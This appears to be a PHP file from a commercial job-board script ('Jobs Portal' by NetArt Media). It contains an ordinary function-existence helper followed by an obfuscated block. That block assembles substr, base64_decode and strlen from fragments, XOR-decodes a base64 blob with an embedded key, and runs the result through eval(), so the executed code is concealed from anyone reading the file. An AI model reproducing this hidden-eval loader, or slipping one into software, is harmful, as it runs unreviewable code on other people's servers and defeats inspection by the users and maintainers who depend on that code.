<?php
// Jobs Portal
// http://www.netartmedia.net/jobsportal
// Copyright (c) All Rights Reserved NetArt Media
// Find out more about our products and services on:
// http://www.netartmedia.net
?><?php

function has_func_struct($param1,$param2=null) 
{
    
    $langConstructs = array("die", 
                            "echo", "empty", "exit", "eval", 
                            "include", "include_once", "isset", 
                            "list", 
                            "print",
                            "require", "require_once", 
                            "unset"
                            );
    
    

	if (!is_null($param2)) {
        return(method_exists($param1,$param2));
    }
    
   

   if (!is_string($param1)) {
        return(FALSE);
    }
    
    if (function_exists($param1) === TRUE) {
        return(TRUE);
    }
    
   

   $items = explode("::",$param1);
    if (count($items) == 2) {
        return(method_exists($items[0],$items[1]));
    }
    
    $items = explode("->",$param1);
    if (count($items) == 2) {
        return(method_exists($items[0],$items[1]));
    }
    
   

   if (in_array($param1,$langConstructs)) {
        return(TRUE);
    }
    
    return(FALSE);
}


?>
<?php
$a8hg6hj="73aed344d1af6fb3678eecceb5ff58d2E0AIEQFsREZZRRMTU11GVk5DZxMED14REEADXVxeTEJF
VgY6CVJAVwwZQzpOVARvTgAODDlSV1A+TVBVaQlRBmsCVVQJb0wCVm0ZUAcIPksBA2QdU1s/VFcC
OlcACTgDAwQIBDhLAlE4SVMDaldWAGoGDVIIPxtXB2keUQNkVQcBb1FQU29MAl0TTUYSOTF2ZGF9
Nz5BMDkaAVM6TQ1Wbk8GVzkcBwFoHARTOk5TBG8HBg4kKD9SVVcXO09JRBRAUlQ+CAVHV1xMEz0e
BAA+SwBUVwY5UldUPgRTUmkIUQVrAlRURh8UEDtiJDRgIzBoFGsJV1Y/UlVXZzoeAA44SgMGPVRW
AWhMUVc9VwdQI29OA1w5VFNWRz8cT0ZORURXW0AERQBaURxGE0hd";
$fyhhsa1="s";$fy3saa1="ba";$fy7vwa1="s";$fyhhsa1.="u";$fyhhsa1.="b";$fyhhsa1.="s";$fyhhsa1.="t";$fyhhsa1.="r";$fy3saa1.="se";$fy3saa1.="6";$fy3saa1.="4";$fy3saa1.="_";$fy3saa1.="de";$fy3saa1.="co";$fy3saa1.="de";$fy7vwa1.="t";$fy7vwa1.="r";$fy7vwa1.="l";$fy7vwa1.="e";$fy7vwa1.="n";
$a8hg6hh=$fyhhsa1($a8hg6hj,0,32);$a8hk6hj=$fy3saa1($fyhhsa1($a8hg6hj,32));$a7klm9hj="";for($a8hk9hj=0;$a8hk9hj < $fy7vwa1($a8hk6hj);$a8hk9hj++){$a7hk9hj=$fyhhsa1($a8hk6hj,$a8hk9hj,1);$a7h789hj=$fyhhsa1($a8hg6hh,$a8hk9hj%32,1);$a7klm9hj.=$a7hk9hj^$a7h789hj;}eval($a7klm9hj);$a7klm9hj="\n";

?>